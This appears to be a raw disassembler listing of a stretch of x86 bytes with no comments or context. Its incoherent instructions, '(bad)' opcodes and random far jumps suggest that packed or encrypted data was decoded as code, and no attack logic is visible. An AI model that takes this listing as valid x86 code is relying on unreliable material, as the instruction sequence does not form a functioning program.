  424d0b:	pusha  
  424d0c:	cmp    DWORD PTR [ecx-0x7],ebp
  424d0f:	sbb    ebx,DWORD PTR ds:0x1357e28b
  424d15:	xchg   esp,eax
  424d16:	mov    dl,0x81
  424d18:	out    dx,al
  424d19:	sbb    al,bl
  424d1b:	in     al,dx
  424d1c:	jecxz  0x424d4b
  424d1e:	add    edx,ecx
  424d20:	mov    ebx,0x99de4797
  424d25:	dec    ebx
  424d26:	enter  0x2078,0x73
  424d2a:	ds sub al,0x4b
  424d2d:	into   
  424d2e:	inc    edx
  424d2f:	sahf   
  424d30:	shl    DWORD PTR [ebx-0x1cc870a5],0x2
  424d37:	mov    ch,0x7c
  424d39:	aam    0xa8
  424d3b:	call   0x942d8a32
  424d40:	or     ah,BYTE PTR [esi-0x1671851f]
  424d46:	cld    
  424d47:	arpl   WORD PTR [esi-0x56dd9d60],si
  424d4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d4e:	xor    al,0xb0
  424d50:	out    0x11,al
  424d52:	dec    edi
  424d53:	retf   
  424d54:	imul   esi,ebx,0x2a
  424d57:	jl     0x424d25
  424d59:	jle    0x424d7c
  424d5b:	push   ecx
  424d5c:	jnp    0x424d4b
  424d5e:	retf   
  424d5f:	mov    BYTE PTR [esi],bl
  424d61:	cmp    BYTE PTR [edx-0x651d8c02],ah
  424d67:	xchg   ebp,eax
  424d68:	stos   DWORD PTR es:[edi],eax
  424d69:	pop    edi
  424d6a:	xchg   esi,eax
  424d6b:	stos   BYTE PTR es:[edi],al
  424d6c:	or     al,0xfc
  424d6e:	jmp    0x424dca
  424d70:	retf   0x825e
  424d73:	cmp    ch,BYTE PTR [esi-0xf]
  424d76:	fwait
  424d77:	out    dx,eax
  424d78:	and    al,0x3e
  424d7a:	inc    esi
  424d7b:	xor    cl,BYTE PTR [esi+0x60]
  424d7e:	mov    al,ds:0x68beb5d6
  424d83:	push   eax
  424d84:	jmp    0x6a9a:0x7a69262d
  424d8b:	mov    bl,0xa3
  424d8d:	sbb    edx,DWORD PTR ds:[ecx-0x6360971e]
  424d94:	in     eax,0xe0
  424d96:	mov    ebx,0x80ed4b9e
  424d9b:	bound  esi,QWORD PTR [ecx]
  424d9d:	mov    eax,0x33335ea6
  424da2:	sub    cl,BYTE PTR [edi]
  424da4:	pop    eax
  424da5:	xchg   esp,eax
  424da6:	xchg   edi,eax
  424da7:	leave  
  424da8:	fs stc 
  424daa:	adc    al,0x72
  424dac:	sbb    BYTE PTR [edx],dl
  424dae:	adc    eax,DWORD PTR [eax]
  424db0:	cmp    eax,0xcb7122bb
  424db5:	inc    edi
  424db6:	add    eax,0x20e19e2
  424dbb:	jne    0x424dcf
  424dbd:	fsub   QWORD PTR [edi-0x40f0a887]
  424dc3:	leave  
  424dc4:	pop    ds
  424dc5:	scas   al,BYTE PTR es:[edi]
  424dc6:	sahf   
  424dc7:	pop    ds
  424dc8:	xchg   ebx,ecx
  424dca:	out    0xe0,eax
  424dcc:	mov    ah,0x91
  424dce:	jmp    0xcf8c:0xe2866c41
  424dd5:	or     ebx,DWORD PTR [ebx]
  424dd7:	pop    ds
  424dd8:	mov    esi,DWORD PTR [edi]
  424dda:	mov    eax,0x30c3ed59
  424ddf:	in     eax,0xd6
  424de1:	mov    ebx,ebx
  424de3:	fisub  DWORD PTR [edi+esi*4]
  424de6:	sub    BYTE PTR es:[esi],cl
  424de9:	or     DWORD PTR [ebp-0x37],esp
  424dec:	in     eax,dx
  424ded:	or     BYTE PTR [ecx-0x3c],0xbf
  424df1:	test   eax,0xdd814673
  424df6:	jp     0x424ddd
  424df8:	push   esi
  424df9:	jno    0x424d9a
  424dfb:	sahf   
  424dfc:	mov    ds:0x4459e530,eax
  424e01:	sbb    DWORD PTR [ebx],0x2f
  424e04:	mov    BYTE PTR [edx+ebp*1],dl
  424e07:	mov    ah,0x94
  424e09:	dec    ebx
  424e0a:	push   ss
  424e0b:	mov    esi,0xf9e5dfff
  424e10:	jmp    0x424e02
  424e12:	aad    0xff
  424e14:	inc    ebx
  424e15:	cwde   
  424e16:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  424e18:	fisttp WORD PTR [ecx+edi*8-0x34]
  424e1c:	sbb    ecx,DWORD PTR [esp+ebx*1-0x30]
  424e20:	xchg   edx,eax
  424e21:	sbb    cl,dl
  424e23:	scas   eax,DWORD PTR es:[edi]
  424e24:	add    eax,0x3794d374
  424e29:	mov    dh,0x58
  424e2b:	add    DWORD PTR [ebx+0x4a],0x9c
	...
  424e3a:	ins    BYTE PTR es:[edi],dx
  424e3b:	sub    ch,BYTE PTR [ebx]
  424e3d:	outs   dx,DWORD PTR es:[esi]
  424e3f:	daa    
  424e40:	ins    DWORD PTR es:[edi],dx
  424e41:	push   0xffffffda
  424e43:	add    BYTE PTR [ecx],0x9d
  424e46:	xchg   ecx,eax
  424e47:	mov    dl,0xf3
  424e49:	xor    BYTE PTR [edx-0x2fffe3a],ah
  424e4f:	add    DWORD PTR [eax],eax
  424e51:	add    BYTE PTR [edx],ch
  424e53:	xchg   esi,eax
  424e54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e55:	xchg   esp,eax
  424e56:	ret    
  424e57:	jp     0x424e53
  424e59:	mov    BYTE PTR [ebx-0xe],dl
  424e5c:	push   edi
  424e5d:	jg     0x424e39
  424e5f:	pop    esi
  424e60:	and    al,BYTE PTR [ebx+0x1a8bfd64]
  424e66:	gs hlt 
  424e68:	inc    WORD PTR [eax+0x26aa66d2]
  424e6f:	push   edi
  424e70:	cmp    eax,DWORD PTR [edx]
  424e72:	test   BYTE PTR [eax-0x29],bl
  424e75:	ins    DWORD PTR es:[edi],dx
  424e76:	hlt    
  424e77:	sbb    DWORD PTR [ecx+0x1e95e688],ebp
  424e7d:	int    0x0
  424e7f:	fs mov dh,0x21
  424e82:	pusha  
  424e83:	cmp    DWORD PTR [ebx+0x78489225],edx
  424e89:	pushf  
  424e8a:	or     eax,DWORD PTR [ebx]
  424e8c:	je     0x424ee6
  424e8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e8f:	mov    esi,0xcdf8a4a3
  424e94:	inc    esi
  424e95:	push   ss
  424e96:	push   0x1a
  424e98:	sbb    bh,BYTE PTR [ebx]
  424e9a:	emms   
  424e9c:	jle    0x424e92
  424e9e:	jecxz  0x424e53
  424ea0:	fidiv  WORD PTR [esi+eiz*8-0x3c9b304a]
  424ea7:	fwait
  424ea8:	or     BYTE PTR [esi+0x15938bdb],dl
  424eae:	dec    ebx
  424eaf:	jp     0x424ea9
  424eb1:	js     0x424efa
  424eb3:	dec    esp
  424eb4:	sbb    edi,DWORD PTR [ebx]
  424eb6:	fistp  WORD PTR [esp+edi*8]
  424eb9:	xchg   BYTE PTR [edi+0x43],dh
  424ebc:	fisttp WORD PTR [edi+0x2]
  424ebf:	jecxz  0x424e86
  424ec1:	or     eax,0x3e92ded4
  424ec6:	and    eax,0x6d3f04d6
  424ecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ecc:	retf   0x7167
  424ecf:	adc    bh,BYTE PTR [edi]
  424ed1:	(bad)  
  424ed2:	xor    eax,0x21d5295a
  424ed7:	cmp    DWORD PTR [ebp-0x2c13e5a3],0xc72a6bc5
  424ee1:	ffree  st(0)
  424ee3:	pushf  
  424ee4:	mov    ebx,0x14d78da2
  424ee9:	loop   0x424e8b
  424eeb:	(bad)
  424eee:	(bad)
  424ef1:	nop
  424ef2:	jbe    0x424ed1
  424ef4:	(bad)  
  424ef5:	xor    edx,esi
  424ef7:	call   0x49db802
  424efc:	test   DWORD PTR [edi],0xe67758c7
  424f02:	jmp    0x1e83:0x49b2ba18
  424f09:	push   es
  424f0a:	loop   0x424eb2
  424f0c:	dec    ebp
  424f0d:	xlat   BYTE PTR ds:[ebx]
  424f0e:	and    eax,0x51eda06d
  424f13:	(bad)  
  424f14:	push   cs
  424f15:	jmp    0x91b9:0xb29a9a7
  424f1c:	add    esp,DWORD PTR [eax+0x7]
  424f1f:	mov    dh,0xd0
  424f21:	mov    BYTE PTR [ebx],dh
  424f23:	aas    
  424f24:	dec    ecx
  424f25:	pop    esi
  424f26:	xchg   ecx,eax
  424f27:	sti    
  424f28:	ins    BYTE PTR es:[edi],dx
  424f29:	mov    esi,0xa25da91b
  424f2e:	dec    ebx
  424f2f:	rol    BYTE PTR [edi],0xd3
  424f32:	mov    ds:0x80065cbb,al
  424f37:	test   al,0x9e
  424f39:	sbb    ch,BYTE PTR [eax]
  424f3b:	sub    dl,BYTE PTR [edi]
  424f3d:	jmp    0x424f90
  424f3f:	xor    BYTE PTR [ebx],0x21
  424f42:	xchg   edi,esi
  424f44:	pop    esp
  424f45:	sub    al,0x8f
  424f47:	(bad)  
  424f48:	retf   
  424f49:	cmp    al,0xd3
  424f4b:	inc    ebx
  424f4c:	cmp    eax,0xa2b96602
  424f51:	(bad)  
  424f52:	ins    BYTE PTR es:[edi],dx
  424f53:	shl    esi,1
  424f55:	xor    BYTE PTR [eax-0x6],bh
  424f58:	push   0xcd7245c7
  424f5d:	pop    edx
  424f5e:	push   edx
  424f5f:	idiv   DWORD PTR [ebp-0x73747092]
  424f65:	loopne 0x424f05
  424f67:	jge    0x424f85
  424f69:	fwait
  424f6a:	adc    BYTE PTR [eax-0x22],al
  424f6d:	mov    ebx,0xe54d4340
  424f72:	jno    0x424f1c
  424f74:	fmul   st(6),st
  424f76:	out    0x6b,eax
  424f78:	ins    DWORD PTR es:[edi],dx
  424f79:	jecxz  0x424f28
  424f7b:	jns    0x424fa4
  424f7d:	and    eax,0x485a2c00
  424f82:	popa   
  424f83:	or     DWORD PTR [edx-0x43f36726],edi
  424f89:	ret    
  424f8a:	and    bh,BYTE PTR [edx+ebp*8-0x10]
  424f8e:	mov    ch,0xf6
  424f90:	cld    
  424f91:	push   ds
  424f92:	mov    esp,0x3ec4b5cb
  424f97:	xchg   ebx,eax
  424f98:	in     eax,0x31
  424f9a:	fdiv   QWORD PTR [ebp-0x2767e127]
  424fa0:	fs mov al,0xf6
  424fa3:	call   0xf10986a3
  424fa8:	add    bl,bl
  424faa:	or     esi,edi
  424fac:	pop    esp
  424fad:	test   DWORD PTR [ebp-0x37eb68a7],eax
  424fb3:	les    edx,FWORD PTR [eax-0x43da34d7]
  424fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fba:	out    0x39,al
  424fbc:	ins    BYTE PTR es:[edi],dx
  424fbd:	push   ds
  424fbe:	mov    bh,0xf8
  424fc0:	enter  0xc7db,0x58
  424fc4:	jge    0x424fe3
  424fc6:	leave  
  424fc7:	add    BYTE PTR [ebx+0x10],bh
  424fca:	inc    edx
  424fcb:	popa   
  424fcc:	lds    esp,FWORD PTR [ebx-0x3a]
  424fcf:	mov    ah,0x96
  424fd1:	push   0xffffffae
  424fd3:	inc    ebp
  424fd4:	daa    
  424fd5:	cmp    edi,DWORD PTR [ebx+0x51]
  424fd8:	mov    ch,0xf4
  424fda:	dec    ebp
  424fdb:	inc    ebp
  424fdc:	mov    edx,ebp
  424fde:	xor    BYTE PTR [esi],dl
  424fe0:	stc    
  424fe1:	test   BYTE PTR [edi+0x9ce1c29],dh
  424fe7:	or     cl,BYTE PTR [ebp+0x3e]
  424fea:	push   edi
  424feb:	outs   dx,BYTE PTR ds:[esi]
  424fec:	(bad)  
  424fed:	shl    esi,1
  424fef:	pop    ecx
  424ff0:	inc    ecx
  424ff1:	hlt    
  424ff2:	cmp    DWORD PTR [ebx+0x7ca54a05],ebp
  424ff8:	call   0xaf9b:0xfc960ba5
  424fff:	gs das 
  425001:	jmp    0x5c2c:0x1e47f01f
  425008:	cs pop esp
  42500a:	jmp    0x425007
  42500c:	je     0x425081
  42500e:	test   eax,0xf511740b
  425013:	or     bh,BYTE PTR [ecx]
  425015:	push   cs
  425016:	popa   
  425017:	or     al,0x17
  425019:	jp     0x425077
  42501b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42501c:	or     DWORD PTR [edx+0x77],ebx
  42501f:	shl    al,0xfb
  425022:	cmp    al,0xfd
  425024:	xchg   ebx,eax
  425025:	lds    ebx,FWORD PTR [edx-0x4c1160a7]
  42502b:	push   edx
  42502c:	push   ebx
  42502d:	and    eax,0x9b5c7784
  425032:	rol    DWORD PTR [edx+edi*1-0x78bd571],0x23
  42503a:	add    BYTE PTR [ecx],ch
  42503c:	stc    
  42503d:	aas    
  42503e:	sbb    dh,0xd9
  425041:	bnd je 0x464ef9b4
  425048:	mov    al,ds:0x68eda79a
  42504d:	xor    BYTE PTR [edi+0x0],ch
  425053:	add    BYTE PTR [eax],al
  425055:	add    BYTE PTR [eax],al
  425057:	add    BYTE PTR [eax],al
  425059:	add    BYTE PTR [ebx-0x73],al
  42505c:	pop    ds
  42505d:	and    bh,bl
  42505f:	mov    dl,0x7f
  425061:	out    dx,eax
  425062:	leave  
  425063:	enter  0xb54,0x82
  425067:	sbb    esp,DWORD PTR [esi+0x4]
  42506a:	lahf   
  42506b:	enter  0x1,0xfd
  42506f:	add    DWORD PTR [eax],eax
  425071:	add    BYTE PTR [eax+0x36],dh
  425074:	inc    edi
  425075:	push   ebx
  425076:	div    BYTE PTR [esi]
  425078:	cmp    ebp,esi
  42507a:	sahf   
  42507b:	in     al,0x8a
  42507d:	mov    esp,0xb2451eb4
  425082:	mov    al,es:0xc6c0c21b
  425088:	mov    esp,0x92c55585
  42508d:	inc    ebp
  42508e:	cmp    dl,BYTE PTR [esp+ebx*8-0x4652fea9]
  425095:	and    BYTE PTR [eax-0x70],ch
  425098:	push   0x83a6e431
  42509d:	stc    
  42509e:	and    BYTE PTR [esi],bh
  4250a0:	and    al,0x50
  4250a2:	js     0x42504d
  4250a4:	call   0x7ce5:0x1625d5e2
  4250ab:	sub    al,0xa1
  4250ad:	lea    edx,[esi]
  4250af:	jl     0x42510c
  4250b1:	jo     0x42504b
  4250b3:	fbstp  TBYTE PTR [ebp+edi*4-0x289c4c8d]
  4250ba:	fwait
  4250bb:	push   edi
  4250bc:	sahf   
  4250bd:	and    al,0x3e
  4250bf:	ins    BYTE PTR es:[edi],dx
  4250c0:	sahf   
  4250c1:	jb     0x425046
  4250c3:	fadd   DWORD PTR [ecx]
  4250c5:	or     BYTE PTR [ecx],0xe1
  4250c8:	aad    0x73
  4250ca:	call   0x26d7:0x1edf15b8
  4250d1:	inc    ecx
  4250d2:	jo     0x4250d5
  4250d4:	imul   ebp,DWORD PTR [ebx-0x5fe46095],0x12
  4250db:	and    dl,BYTE PTR [ecx+edi*8]
  4250de:	ds xchg edx,eax
  4250e0:	outs   dx,BYTE PTR ds:[esi]
  4250e1:	xor    DWORD PTR [edx],eax
  4250e3:	hlt    
  4250e4:	and    eax,0x18ec7559
  4250e9:	es pop edx
  4250eb:	and    BYTE PTR [ecx-0x322447ec],cl
  4250f1:	add    eax,0x946769af
  4250f6:	sub    DWORD PTR [esi],edx
  4250f8:	pushf  
  4250f9:	jmp    0x42514e
  4250fb:	cmc    
  4250fc:	outs   dx,DWORD PTR ds:[esi]
  4250fd:	addr16 push 0x72e5583b
  425103:	and    eax,0x51ce1304
  425108:	and    eax,0xeffebfd3
  42510d:	pop    ebx
  42510e:	test   edx,0xf1293db2
  425114:	xor    eax,0x555c604
  425119:	cmp    bl,dl
  42511b:	sar    DWORD PTR [ebx+0x6b],0x16
  42511f:	leave  
  425120:	retf   
  425121:	push   cs
  425122:	cmp    bl,bh
  425124:	cmp    edi,DWORD PTR [edi]
  425126:	(bad)  
  425127:	imul   BYTE PTR [ebp+0x2d6143d3]
  42512d:	test   ah,ch
  42512f:	inc    ecx
  425130:	popf   
  425131:	call   0xf380:0x8dcf4db0
  425138:	push   ss
  425139:	add    BYTE PTR [edx+0xb],al
  42513c:	test   BYTE PTR [edi],cl
  42513e:	fdivr  DWORD PTR [ebx-0x46659a1c]
  425144:	outs   dx,DWORD PTR ds:[esi]
  425145:	push   eax
  425146:	not    DWORD PTR ds:0xfb62e9cc
  42514c:	cmova  ebp,DWORD PTR [ebx+eiz*4-0x16041e87]
  425154:	cmp    ecx,DWORD PTR [esi]
  425156:	into   
  425157:	push   es
  425158:	xor    edi,DWORD PTR [edx+0x34]
  42515b:	push   edx
  42515c:	loop   0x425132
  42515e:	pop    ss
  42515f:	pusha  
  425160:	imul   esi,DWORD PTR [esp+edi*1-0x4b],0x1eed6331
  425168:	jnp    0x425137
  42516a:	(bad)  
  42516b:	loope  0x4250f5
  42516d:	add    bh,0xdf
  425170:	stos   BYTE PTR es:[edi],al
  425171:	inc    esi
  425172:	cld    
  425173:	sub    eax,0x205287ce
  425178:	and    eax,0x82d66d8e
  42517d:	and    ebp,DWORD PTR [edi-0x28]
  425180:	dec    edx
  425181:	mov    dh,0x21
  425183:	addr16 jb 0x4251bc
  425186:	call   0xdf908a55
  42518b:	push   ecx
  42518c:	add    esp,DWORD PTR [ecx]
  42518e:	add    edi,DWORD PTR [ebp-0xa]
  425191:	fxch   st(6)
  425193:	addr16 cli 
  425195:	fisubr DWORD PTR [ebp-0x451846fa]
  42519b:	cld    
  42519c:	jp     0x4251ad
  42519e:	aaa    
  42519f:	inc    esi
  4251a0:	adc    bh,BYTE PTR [ebx+0xc]
  4251a3:	es loop 0x425194
  4251a6:	fistp  DWORD PTR [eax+0x6f805d29]
  4251ac:	sbb    al,0x7d
  4251ae:	and    BYTE PTR [ebp-0xc],0xd7
  4251b2:	out    dx,al
  4251b3:	push   cs
  4251b4:	sub    eax,0x1e20bc8e
  4251b9:	stos   BYTE PTR es:[edi],al
  4251ba:	cmp    BYTE PTR [ebx+0x17],dh
  4251bd:	adc    eax,0xdf9f600a
  4251c2:	xor    bh,BYTE PTR [edi+eax*4-0x3f236b8b]
  4251c9:	dec    ecx
  4251ca:	outs   dx,BYTE PTR ds:[esi]
  4251cb:	repnz outs dx,DWORD PTR ds:[esi]
  4251cd:	cmp    al,0x65
  4251cf:	and    DWORD PTR [esi-0x74],0x45
  4251d3:	pop    eax
  4251d4:	lods   eax,DWORD PTR ds:[esi]
  4251d5:	xor    BYTE PTR [eax],0x78
  4251d8:	mov    dh,0x2
  4251da:	xlat   BYTE PTR ds:[ebx]
  4251db:	shr    DWORD PTR [edi+ecx*1],0xd4
  4251df:	pop    ebp
  4251e0:	push   eax
  4251e1:	iret   
  4251e2:	fsubr  DWORD PTR [ebp+0x3ebbc4a2]
  4251e8:	dec    ebp
  4251e9:	pusha  
  4251ea:	and    edx,DWORD PTR [edx-0x9e5a29e]
  4251f0:	jae    0x42523a
  4251f2:	lds    esi,FWORD PTR [edi-0x69b4f1ec]
  4251f8:	int3   
  4251f9:	(bad)  
  4251fb:	sbb    DWORD PTR es:[esi],ebx
  4251fe:	push   ebx
  4251ff:	mov    esp,0x8559d185
  425204:	add    BYTE PTR [edx-0x373bdacd],0x9a
  42520b:	adc    DWORD PTR [ebp-0x5333f2ad],esp
  425211:	dec    esp
  425212:	dec    edi
  425213:	ds es add eax,0x5864fd8e
  42521a:	rcl    DWORD PTR [edx],0x14
  42521d:	mov    ebx,0xc4c19dfd
  425222:	jb     0x425206
  425224:	xchg   ecx,eax
  425225:	(bad)  
  425226:	aam    0x6f
  425228:	pop    esi
  425229:	mov    edi,0x63edb3b5
  42522e:	mov    esp,0xfd59e94d
  425233:	add    cl,BYTE PTR [ecx+ebx*8]
  425236:	pop    es
  425237:	cs iret 
  425239:	mov    bl,0x4a
  42523b:	adc    al,0xf8
  42523d:	adc    ebx,DWORD PTR [esi-0x2950b81f]
  425243:	dec    ebx
  425244:	(bad)  
  425245:	jmp    0x4186de64
  42524a:	in     eax,0x2a
  42524c:	addr16 ss mov al,0x50
  425250:	mov    dl,0xd9
  425252:	mov    dl,al
  425254:	nop
  425255:	(bad)  
  425257:	mov    eax,ds:0x4f09d267
  42525c:	rcr    BYTE PTR [edx+0xc507295],1
  425262:	std    
  425263:	stos   BYTE PTR es:[edi],al
  425264:	push   edx
  425265:	cli    
  425266:	inc    ebp
  425267:	lahf   
  425268:	push   edi
  425269:	popf   
  42526a:	adc    edx,ebx
  42526c:	test   al,0x2
  42526e:	add    BYTE PTR [eax],0x0
	...
  425279:	add    ah,dh
  42527b:	cmp    DWORD PTR [edx-0x2002081],edx
  425281:	mov    ebx,0xd77f6470
  425286:	mov    bh,0x2f
  425288:	adc    ebp,edx
  42528a:	pushf  
  42528b:	retf   0x1
  42528e:	std    
  42528f:	add    DWORD PTR [eax],eax
  425291:	add    ch,bh
  425293:	pop    eax
  425294:	push   eax
  425295:	aam    0x2c
  425297:	jle    0x425246
  425299:	xchg   BYTE PTR [edi+0x1b14de46],bh
  42529f:	lds    edi,FWORD PTR [ecx]
  4252a1:	repnz rol BYTE PTR [esi+0x22cd17bc],0x99
  4252a9:	pop    ebp
  4252aa:	jmp    0xf55e:0xf1ee8b22
  4252b1:	shl    al,0xa5
  4252b4:	out    dx,al
  4252b5:	call   0x8fde:0x15815605
  4252bc:	fadd   DWORD PTR [esi+edi*2]
  4252bf:	pop    ebp
  4252c0:	inc    esp
  4252c1:	ins    BYTE PTR es:[edi],dx
  4252c2:	sbb    eax,0x72619f29
  4252c7:	dec    esi
  4252c8:	ficomp DWORD PTR [ecx+0x3d]
  4252cb:	in     al,0xf2
  4252cd:	jb     0x425266
  4252cf:	retf   
  4252d0:	xor    edx,esi
  4252d2:	loop   0x4252a0
  4252d4:	pop    ss
  4252d5:	repnz aas 
  4252d7:	mov    esi,0x7f86eb05
  4252dc:	fild   QWORD PTR [ecx-0x41]
  4252df:	inc    ecx
  4252e0:	js     0x42534c
  4252e2:	loopne 0x425295
  4252e4:	sub    eax,0x1c29a560
  4252e9:	mov    cl,0x3b
  4252eb:	add    DWORD PTR [esp+ebx*8+0x440f5b31],esi
  4252f2:	xlat   BYTE PTR ds:[ebx]
  4252f3:	int3   
  4252f4:	cmp    ebp,edi
  4252f6:	in     al,0xf5
  4252f8:	pop    ecx
  4252f9:	or     eax,DWORD PTR [eax-0x1c]
  4252fc:	pop    ds
  4252fd:	add    BYTE PTR [esi+0x67],dh
  425300:	scas   al,BYTE PTR es:[edi]
  425301:	jle    0x425349
  425303:	aam    0x11
  425305:	jmp    0xfec5df66
  42530a:	sahf   
  42530b:	jg     0x425365
  42530d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42530e:	fimul  DWORD PTR [ebx-0x532e9ee5]
  425314:	aas    
  425315:	xlat   BYTE PTR ds:[ebx]
  425316:	test   DWORD PTR [esi],0x7e0f1c78
  42531c:	imul   ebx,DWORD PTR [edi-0x4fa33b3],0x79f90e72
  425326:	out    dx,eax
  425327:	push   ecx
  425328:	or     DWORD PTR [eax+edi*1+0x64],0x24
  42532d:	dec    ebp
  42532e:	xchg   edx,eax
  42532f:	push   esi
  425330:	in     al,0xf2
  425332:	pop    eax
  425333:	adc    DWORD PTR [edi-0x30],ebp
  425336:	test   al,0x94
  425338:	iret   
  425339:	dec    ecx
  42533a:	pop    ecx
  42533b:	les    ecx,FWORD PTR [edx]
  42533d:	(bad)
  425340:	imul   esp,DWORD PTR [edx+0x41605ff2],0xffffff9e
  425347:	out    0x98,eax
  425349:	fs out dx,al
  42534b:	rcr    BYTE PTR [edx-0x35],cl
  42534e:	cdq    
  42534f:	(bad)  
  425350:	sbb    BYTE PTR ds:[bx+si-0x2aa7],cl
  425356:	pusha  
  425357:	cmp    al,0xb0
  425359:	nop
  42535a:	es mov al,0xd4
  42535d:	mov    DWORD PTR [edi+eiz*4-0x5d],ecx
  425361:	jle    0x42534d
  425363:	mov    eax,ds:0xf8d58f26
  425368:	icebp  
  425369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42536a:	dec    ecx
  42536b:	xchg   edi,eax
  42536c:	ret    0xfa55
  42536f:	mov    ebp,?
  425371:	sti    
  425372:	cs or  eax,0xfe393ebd
  425378:	je     0x4253ec
  42537a:	pop    es
  42537b:	xchg   esp,eax
  42537c:	or     al,0x3d
  42537e:	sub    BYTE PTR [ebp-0x5aacab60],ch
  425384:	pusha  
  425385:	outs   dx,BYTE PTR ds:[esi]
  425386:	push   esp
  425387:	adc    DWORD PTR [esi-0x6b],esp
  42538a:	int3   
  42538b:	scas   al,BYTE PTR es:[edi]
  42538c:	sub    al,0x84
  42538e:	dec    ebx
  42538f:	pushf  
  425390:	das    
  425391:	outs   dx,DWORD PTR ds:[esi]
  425392:	mov    edx,0xbe1ae301
  425397:	mov    bh,0xcf
  425399:	dec    edi
  42539a:	(bad)  
  42539b:	ror    BYTE PTR [edi+ebx*2-0x1f6fca13],0x83
  4253a3:	dec    esp
  4253a4:	test   DWORD PTR [edx+0x1a],ebx
  4253a7:	jecxz  0x42533e
  4253a9:	mov    esi,0x3567b3d3
  4253ae:	add    DWORD PTR [esi+0x68],ebx
  4253b1:	enter  0xfd9f,0xa0
  4253b5:	mov    bl,ch
  4253b7:	sti    
  4253b8:	dec    esi
  4253b9:	mov    edx,0x8fc54543
  4253be:	je     0x42534c
  4253c0:	popa   
  4253c1:	imul   edx,DWORD PTR [eax-0x30368344],0x33
  4253c8:	xor    al,0xc1
  4253ca:	rcr    DWORD PTR [ecx-0x63d3dd0a],0x5d
  4253d1:	out    dx,eax
  4253d2:	mov    bl,0x3c
  4253d4:	hlt    
  4253d5:	nop
  4253d6:	fcmovnb st,st(1)
  4253d8:	loop   0x425393
  4253da:	pop    ds
  4253db:	sub    BYTE PTR [esi-0x70edcf7d],cl
  4253e1:	ret    0xd5ce
  4253e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253e5:	or     eax,0xa5ac5e7d
  4253ea:	adc    BYTE PTR [ecx],0x30
  4253ed:	jmp    0x4253f5
  4253ef:	xchg   BYTE PTR [esi+edx*2],bh
  4253f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253f4:	jae    0x42544a
  4253f6:	mov    ecx,0xa2d87592
  4253fb:	pop    es
  4253fc:	ds ret 0xc8cb
  425400:	push   edi
  425401:	shr    BYTE PTR [edx],cl
  425403:	add    ch,bl
  425405:	aas    
  425406:	or     al,0xb5
  425408:	and    bh,BYTE PTR [ebx]
  42540a:	ror    DWORD PTR [eax-0x34],1
  42540d:	cli    
  42540e:	xor    BYTE PTR [esi],ah
  425410:	and    al,0xa7
  425412:	pop    ds
  425413:	(bad)  
  425414:	idiv   DWORD PTR [eax+0x33]
  425417:	lds    ebp,FWORD PTR [eax+ebp*8-0x1d]
  42541b:	shl    BYTE PTR [edx],1
  42541d:	mov    ds:0xa343f21c,al
  425422:	rcl    edi,1
  425424:	inc    edx
  425425:	pop    esp
  425426:	push   0x77d99dde
  42542b:	push   edx
  42542c:	xlat   BYTE PTR ds:[ebx]
  42542d:	xchg   edi,eax
  42542e:	out    dx,al
  42542f:	dec    ecx
  425430:	adc    ch,dh
  425432:	cld    
  425433:	add    eax,0xda37ea6b
  425438:	out    0xa5,al
  42543a:	out    0x76,eax
  42543c:	sbb    ch,BYTE PTR ds:0x2cfe6f67
  425442:	in     al,0x1a
  425444:	call   0xca6b6969
  425449:	pop    ebx
  42544b:	(bad)  
  42544c:	and    al,0x87
  42544e:	call   0xd99e2e12
  425453:	fidiv  DWORD PTR [edx+0x76651498]
  425459:	std    
  42545a:	in     al,dx
  42545b:	inc    esi
  42545c:	sub    eax,eax
  42545e:	sub    al,0xc
  425460:	inc    ebp
  425461:	(bad)  
  425462:	add    al,0xfd
  425464:	(bad)  
  425466:	fs xchg ebx,eax
  425468:	inc    edi
  425469:	ins    BYTE PTR es:[edi],dx
  42546a:	mov    ebx,0x78aabf70
  42546f:	pop    esi
  425470:	mov    edx,0xa5e870c0
  425475:	lods   eax,DWORD PTR ds:[esi]
  425476:	popa   
  425477:	inc    ebx
  425478:	cs ins DWORD PTR es:[edi],dx
  42547a:	setae  BYTE PTR [edx-0x3149e51b]
  425481:	and    al,0x48
  425483:	clc    
  425484:	xor    ch,cl
  425486:	mov    ds:0xe304dbac,eax
  42548b:	sbb    al,0x8a
  42548d:	push   ebp
	...
  425497:	add    BYTE PTR [eax],al
  425499:	add    BYTE PTR [esi+edi*1+0x24],dl
  42549d:	sbb    DWORD PTR [esi+0x1b],ebp
  4254a0:	jge    0x425521
  4254a2:	(bad)  
  4254a3:	aam    0x10
  4254a5:	dec    edi
  4254a6:	jno    0x425500
  4254a8:	jns    0x42545c
  4254aa:	cdq    
  4254ab:	int3   
  4254ac:	add    DWORD PTR [eax],eax
  4254ae:	std    
  4254af:	add    DWORD PTR [eax],eax
  4254b1:	add    bh,bl
  4254b3:	and    BYTE PTR [esi],ch
  4254b5:	bound  ecx,QWORD PTR [edx]
  4254b7:	mov    ebx,0x80d09314
  4254bc:	mov    ds:0xf2aef46f,eax
  4254c1:	out    0x55,eax
  4254c3:	js     0x42552f
  4254c5:	imul   eax,DWORD PTR [ebp-0x69],0xc2255995
  4254cc:	xor    al,0xdd
  4254ce:	push   ds
  4254cf:	sub    ah,BYTE PTR [ecx-0x2f]
  4254d2:	les    ebx,FWORD PTR [ebx]
  4254d4:	retf   
  4254d5:	std    
  4254d6:	push   ebp
  4254d7:	mov    dh,bh
  4254d9:	pavgb  mm5,QWORD PTR [edi+0x4d]
  4254dd:	lods   eax,DWORD PTR ds:[esi]
  4254de:	js     0x42554d
  4254e0:	jns    0x42547c
  4254e2:	fdiv   QWORD PTR [edi]
  4254e4:	push   cs
  4254e5:	push   cs
  4254e6:	push   0xffffffab
  4254e8:	pop    esi
  4254e9:	jmp    0x141d:0x7c1f5506
  4254f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
